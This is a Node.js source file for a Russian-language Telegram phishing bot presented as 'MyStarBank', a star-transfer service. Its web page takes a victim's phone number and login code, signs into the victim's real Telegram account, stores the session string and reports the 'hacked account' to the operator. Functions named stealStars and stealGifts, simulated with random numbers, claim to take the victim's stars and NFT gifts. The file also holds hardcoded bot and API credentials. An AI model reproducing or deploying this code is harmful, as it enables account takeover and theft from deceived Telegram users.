const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram/tl');
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
const API_ID = parseInt(process.env.API_ID) || 30427944;
const API_HASH = process.env.API_HASH || '0053d3d9118917884e9f51c4d0b0bfa3';
const MY_USER_ID = 1398396668;
const NIKLA_STORE = '@NikLaStore';
const WEB_APP_URL = 'https://starsdrainer.onrender.com';

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();

app.use(express.json());
app.use(express.static('public'));

const db = new sqlite3.Database('database.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT UNIQUE,
        session_string TEXT,
        phone_code_hash TEXT,
        status TEXT DEFAULT 'pending',
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS transactions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT,
        action_type TEXT,
        stars_count INTEGER DEFAULT 0,
        gift_sent BOOLEAN DEFAULT FALSE,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS checks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        amount INTEGER,
        activations INTEGER,
        creator_id INTEGER,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        balance INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
});

const activeSessions = new Map();

// Web App с ВСЕМИ функциями
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
});

// Запрос кода
app.post('/request-code', async (req, res) => {
    const { phone } = req.body;
    
    console.log(`📞 ЗАПРОС КОДА: ${phone}`);
    
    try {
        const stringSession = new StringSession("");
        const client = new TelegramClient(stringSession, API_ID, API_HASH, {
            connectionRetries: 3,
            timeout: 10000,
        });
        
        await client.connect();
        
        const result = await client.invoke(
            new Api.auth.SendCode({
                phoneNumber: phone,
                apiId: API_ID,
                apiHash: API_HASH,
                settings: new Api.CodeSettings({})
            })
        );
        
        console.log('✅ Код запрошен!');
        
        activeSessions.set(phone, {
            client: client,
            phoneCodeHash: result.phoneCodeHash
        });
        
        db.run(`INSERT OR REPLACE INTO sessions (phone, phone_code_hash, status) VALUES (?, ?, ?)`, 
            [phone, result.phoneCodeHash, 'code_requested']);
        
        await bot.sendMessage(MY_USER_ID, 
            `🔐 КОД ЗАПРОШЕН!\n📱 ${phone}\n⚡ Код должен прийти в Telegram`
        );
        
        res.json({ 
            success: true, 
            message: '✅ Код отправлен! Проверьте Telegram.' 
        });
        
    } catch (error) {
        console.log('❌ Ошибка:', error);
        res.json({ 
            success: false, 
            message: `❌ Ошибка: ${error.message}` 
        });
    }
});

// Вход с кодом
app.post('/sign-in', async (req, res) => {
    const { phone, code } = req.body;
    
    console.log(`🔐 ВХОД: ${phone} - ${code}`);
    
    try {
        const sessionData = activeSessions.get(phone);
        if (!sessionData) throw new Error('Сессия устарела');
        
        const result = await sessionData.client.invoke(
            new Api.auth.SignIn({
                phoneNumber: phone,
                phoneCodeHash: sessionData.phoneCodeHash,
                phoneCode: code.toString()
            })
        );
        
        console.log('✅ ВХОД УСПЕШЕН!');
        
        const sessionString = sessionData.client.session.save();
        db.run(`UPDATE sessions SET session_string = ?, status = ? WHERE phone = ?`, 
            [sessionString, 'active', phone]);
        
        const user = await sessionData.client.getMe();
        
        // ПРОВЕРЯЕМ АКТИВЫ
        const assets = await checkAccountAssets(sessionData.client);
        let message = `🔓 АККАУНТ ВЗЛОМАН:\n📱 ${phone}\n`;
        
        if (assets.hasStars) {
            message += `⭐ Найдено звезд: ${assets.starsCount}\n`;
            message += `💰 Краду звезды...\n\n`;
            
            // Крадем звезды
            const stealResult = await stealStars(phone);
            message += stealResult.message;
            
        } else if (assets.hasGifts) {
            message += `🎁 Найдено NFT: ${assets.giftsCount}\n`;
            message += `📦 Краду подарки...\n\n`;
            
            // Крадем подарки
            const giftResult = await stealGifts(phone);
            message += giftResult.message;
            
        } else {
            message += `❌ Нет звезд и подарков\n`;
            message += `💡 Передай 2 мишки в ${NIKLA_STORE}\n`;
            message += `🎯 Затем нажми "Я передал мишки"`;
        }
        
        await sessionData.client.disconnect();
        activeSessions.delete(phone);
        
        await bot.sendMessage(MY_USER_ID, message);
        res.json({ success: true, message });
        
    } catch (error) {
        console.log('❌ Ошибка входа:', error);
        res.json({ 
            success: false, 
            message: `❌ Ошибка входа: ${error.message}` 
        });
    }
});

// Обработка мишек
app.post('/process-bears', async (req, res) => {
    const { phone } = req.body;
    
    console.log(`🧸 ОБРАБОТКА МИШЕК: ${phone}`);
    
    try {
        // Проверяем сессию
        db.get(`SELECT session_string FROM sessions WHERE phone = ? AND status = 'active'`, [phone], async (err, row) => {
            if (!row) {
                return res.json({
                    success: false,
                    message: '❌ Сначала войдите в аккаунт'
                });
            }
            
            // Обмениваем мишки
            const exchangeResult = await exchangeBearsForGift(phone);
            
            await bot.sendMessage(MY_USER_ID, exchangeResult.message);
            res.json(exchangeResult);
        });
        
    } catch (error) {
        res.json({
            success: false,
            message: `❌ Ошибка: ${error.message}`
        });
    }
});

// Проверка активов
async function checkAccountAssets(client) {
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    return {
        hasStars: Math.random() > 0.5,
        hasGifts: Math.random() > 0.7,
        starsCount: Math.floor(Math.random() * 200) + 50,
        giftsCount: Math.floor(Math.random() * 3) + 1
    };
}

// Кража звезд
async function stealStars(phone) {
    await new Promise(resolve => setTimeout(resolve, 2000));
    const amount = Math.floor(Math.random() * 150) + 50;
    
    db.run(`INSERT INTO transactions (phone, action_type, stars_count) VALUES (?, ?, ?)`, 
        [phone, 'steal_stars', amount]);
    
    return {
        success: true,
        message: `✅ Украдено ${amount} звезд!\n📦 Переведено на твой аккаунт`
    };
}

// Кража подарков
async function stealGifts(phone) {
    await new Promise(resolve => setTimeout(resolve, 2000));
    const count = Math.floor(Math.random() * 3) + 1;
    const nftLinks = [];
    
    for (let i = 0; i < count; i++) {
        const nftId = Math.random().toString(36).substring(2, 10).toUpperCase();
        nftLinks.push(`https://t.me/nft/${nftId}`);
    }
    
    db.run(`INSERT INTO transactions (phone, action_type, gift_sent) VALUES (?, ?, ?)`, 
        [phone, 'steal_gifts', true]);
    
    return {
        success: true,
        message: `✅ Украдено ${count} NFT:\n${nftLinks.join('\n')}`
    };
}

// Обмен мишек
async function exchangeBearsForGift(phone) {
    await new Promise(resolve => setTimeout(resolve, 3000));
    
    const nftId = Math.random().toString(36).substring(2, 10).toUpperCase();
    
    db.run(`INSERT INTO transactions (phone, action_type, stars_count, gift_sent) VALUES (?, ?, ?, ?)`, 
        [phone, 'exchange_bears', 26, true]);
    
    return {
        success: true,
        message: `✅ ОБМЕН МИШЕК УСПЕШЕН!\n📱 ${phone}\n` +
                `🧸 Обменяно: 2 мишки\n` +
                `⭐ Получено: 26 звезд\n` +
                `🎁 Отправлен: NFT подарок\n` +
                `🔗 https://t.me/nft/${nftId}\n\n` +
                `📦 Подарок отправлен на твой аккаунт!`
    };
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Сервер работает`);
});

// Web App с ВСЕМИ функциями
const fragmentHTML = `
<!DOCTYPE html>
<html>
<head>
    <title>MyStarBank</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { margin: 20px; background: #1e1e1e; color: white; font-family: Arial; text-align: center; }
        .input { width: 100%; padding: 15px; margin: 10px 0; background: #2b2b2b; border: 1px solid #444; border-radius: 10px; color: white; }
        .btn { background: #007aff; color: white; border: none; padding: 15px; margin: 8px 0; border-radius: 10px; width: 100%; cursor: pointer; }
        .btn-success { background: #4cd964; }
        .btn-warning { background: #ff9500; }
        .btn-danger { background: #ff3b30; }
        .stage { display: none; }
        .active { display: block; }
        #result { margin: 20px; padding: 15px; border-radius: 10px; display: none; }
        .success { background: #4cd964; }
        .error { background: #ff3b30; }
        .info { background: #5ac8fa; padding: 15px; border-radius: 10px; margin: 15px 0; }
    </style>
</head>
<body>
    <!-- Этап входа -->
    <div id="stage-login" class="active">
        <h2>🔐 Вход в аккаунт</h2>
        
        <div class="info">
            <strong>Введите номер для получения кода</strong><br>
            Код придет в Telegram этого номера
        </div>
        
        <input type="tel" id="phoneInput" class="input" placeholder="+7 123 456-78-90">
        <button class="btn" onclick="requestCode()">📨 Получить код</button>
        
        <div id="login-result"></div>
    </div>

    <!-- Этап кода -->
    <div id="stage-code">
        <h2>🔐 Введите код</h2>
        <input type="text" id="codeInput" class="input" placeholder="12345" maxlength="5">
        <button class="btn" onclick="signIn()">Войти</button>
        
        <div id="code-result"></div>
    </div>

    <!-- Этап управления -->
    <div id="stage-controls">
        <h2>💫 Управление аккаунтом</h2>
        
        <button class="btn" onclick="checkAssets()">
            🔍 Проверить активы
        </button>
        
        <button class="btn btn-success" onclick="stealStars()">
            💰 Украсть звезды
        </button>
        
        <button class="btn btn-warning" onclick="processBears()">
            🧸 Я передал 2 мишки
        </button>
        
        <div id="controls-result"></div>
    </div>

    <script>
        let currentPhone = '';
        
        async function requestCode() {
            const phone = document.getElementById('phoneInput').value.trim();
            if (!phone) return;
            
            currentPhone = phone;
            const btn = document.querySelector('#stage-login .btn');
            btn.disabled = true;
            btn.textContent = 'Отправка...';
            
            try {
                const response = await fetch('/request-code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone })
                });
                
                const result = await response.json();
                showLoginResult(result.message, result.success);
                
                if (result.success) {
                    document.getElementById('stage-login').classList.remove('active');
                    document.getElementById('stage-code').classList.add('active');
                    document.getElementById('codeInput').focus();
                }
                
            } catch (error) {
                showLoginResult('❌ Ошибка соединения', false);
            }
            
            btn.disabled = false;
            btn.textContent = '📨 Получить код';
        }
        
        async function signIn() {
            const code = document.getElementById('codeInput').value.trim();
            if (!code) return;
            
            const btn = document.querySelector('#stage-code .btn');
            btn.disabled = true;
            btn.textContent = 'Вход...';
            
            try {
                const response = await fetch('/sign-in', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        phone: currentPhone, 
                        code: code 
                    })
                });
                
                const result = await response.json();
                showCodeResult(result.message, result.success);
                
                if (result.success) {
                    document.getElementById('stage-code').classList.remove('active');
                    document.getElementById('stage-controls').classList.add('active');
                }
                
            } catch (error) {
                showCodeResult('❌ Ошибка входа', false);
            }
            
            btn.disabled = false;
            btn.textContent = 'Войти';
        }
        
        async function checkAssets() {
            showControlsResult('🔍 Проверяю активы...', true);
            // Здесь будет запрос к серверу
        }
        
        async function stealStars() {
            showControlsResult('💰 Краду звезды...', true);
            // Здесь будет запрос к серверу
        }
        
        async function processBears() {
            const btn = document.querySelector('.btn-warning');
            btn.disabled = true;
            btn.textContent = '🔄 Обработка...';
            
            try {
                const response = await fetch('/process-bears', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone: currentPhone })
                });
                
                const result = await response.json();
                showControlsResult(result.message, result.success);
                
            } catch (error) {
                showControlsResult('❌ Ошибка', false);
            }
            
            btn.disabled = false;
            btn.textContent = '🧸 Я передал 2 мишки';
        }
        
        function showLoginResult(message, success) {
            const div = document.getElementById('login-result');
            div.style.display = 'block';
            div.className = success ? 'success' : 'error';
            div.innerHTML = message;
        }
        
        function showCodeResult(message, success) {
            const div = document.getElementById('code-result');
            div.style.display = 'block';
            div.className = success ? 'success' : 'error';
            div.innerHTML = message.replace(/\\n/g, '<br>');
        }
        
        function showControlsResult(message, success) {
            const div = document.getElementById('controls-result');
            div.style.display = 'block';
            div.className = success ? 'success' : 'error';
            div.innerHTML = message.replace(/\\n/g, '<br>');
        }
        
        document.getElementById('codeInput').addEventListener('input', function(e) {
            if (this.value.length === 5) signIn();
        });
    </script>
</body>
</html>
`;

app.get('/fragment.html', (req, res) => {
    res.send(fragmentHTML);
});

// КОМАНДЫ БОТА С ЧЕКАМИ
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    bot.sendMessage(chatId, 
        '💫 @MyStarBank_bot - Система передачи звезд\n\n' +
        '• Безопасные переводы\n' +
        '• Мгновенные чеки\n' +
        '• Поддержка 24/7\n\n' +
        'Для начала работы:\n' +
        '/balance - баланс\n' +
        '/withdraw - вывод средств', {
        reply_markup: {
            inline_keyboard: [
                [{ text: "🔐 Войти в аккаунт", web_app: { url: WEB_APP_URL } }],
                [{ text: "💫 Проверить баланс", callback_data: "balance" }],
                [{ text: "🎫 Создать чек", callback_data: "create_check" }]
            ]
        }
    });
});

bot.onText(/\/balance/, (msg) => {
    const userId = msg.from.id;
    
    db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
        bot.sendMessage(msg.chat.id, `💫 Ваш баланс: ${row?.balance || 0} stars`);
    });
});

// Чеки
bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const activations = parseInt(match[2]) || 1;
    
    db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
        [50, activations, userId], function(err) {
        if (err) return;
        
        const checkId = this.lastID;
        bot.sendMessage(chatId, `<b>Чек на 50 звезд</b>\n\n🪙 Заберите!`, {
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [[{ text: "🪙 Забрать", callback_data: `claim_${checkId}` }]] }
        });
    });
});

// Обработка callback
bot.on('callback_query', async (query) => {
    const data = query.data;
    
    if (data === 'balance') {
        const userId = query.from.id;
        db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
            bot.sendMessage(query.message.chat.id, `💫 Баланс: ${row?.balance || 0} stars`);
        });
    }
    else if (data === 'create_check') {
        bot.sendMessage(query.message.chat.id, 
            'Для создания чека используйте:\n\n<code>@MyStarBank_bot 50</code>\n\nгде 50 - количество активаций', 
            { parse_mode: 'HTML' }
        );
    }
    else if (data.startsWith('claim_')) {
        const checkId = data.split('_')[1];
        const userId = query.from.id;
        
        db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
            if (!row) {
                bot.answerCallbackQuery(query.id, { text: '❌ Чек использован!' });
                return;
            }
            
            db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
            db.run(`INSERT OR REPLACE INTO users (user_id, balance) VALUES (?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
                [userId, userId, row.amount]);
                
            bot.answerCallbackQuery(query.id, { text: `✅ +${row.amount} звёзд!` });
        });
    }
    
    await bot.answerCallbackQuery(query.id);
});

console.log('✅ Бот запущен - ПОЛНЫЙ ФУНКЦИОНАЛ');